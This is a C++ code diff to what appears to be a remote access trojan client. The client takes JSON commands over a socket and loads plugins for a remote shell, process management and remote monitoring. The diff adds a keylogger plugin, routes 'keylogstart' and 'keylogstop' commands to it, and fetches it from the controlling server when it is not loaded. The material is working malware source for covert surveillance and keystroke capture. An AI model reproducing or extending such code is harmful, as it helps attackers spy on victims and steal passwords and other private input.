@@ -39,6 +39,7 @@ private:
     const string PROCESS_MANAGER_PLUGIN_ID = "ProcessManagerPlugin";
     const string REMOTE_SHELL_PLUGIN_ID = "RemoteShellPlugin";
     const string REMOTE_MONITORING_PLUGIN_ID = "RemoteMonitoringPlugin";
+    const string KEYLOGGER_PLUGIN_ID = "KeyloggerPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -88,6 +89,14 @@ private:
         }
     }
 
+    void execute_keylogger_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(KEYLOGGER_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(KEYLOGGER_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(KEYLOGGER_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -109,6 +118,9 @@ private:
             else if (action == "monitorlist" || action == "monitorstart" || action == "monitorstop" ||
                      action == "mouseevent" || action == "keyevent") {
                 execute_remote_monitoring_command(data);
+            }
+            else if (action == "keylogstart" || action == "keylogstop") {
+                execute_keylogger_command(data);
             }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
@@ -182,6 +194,12 @@ private:
                                         pluginMgr.executePluginCommand(REMOTE_MONITORING_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                     } else {
                                         pluginMgr.executePlugin(REMOTE_MONITORING_PLUGIN_ID, "RunPlugin", sock);
+                                    }
+                                } else if (pluginId == KEYLOGGER_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(KEYLOGGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        pluginMgr.executePlugin(KEYLOGGER_PLUGIN_ID, "RunPlugin", sock);
                                     }
                                 }
                             }
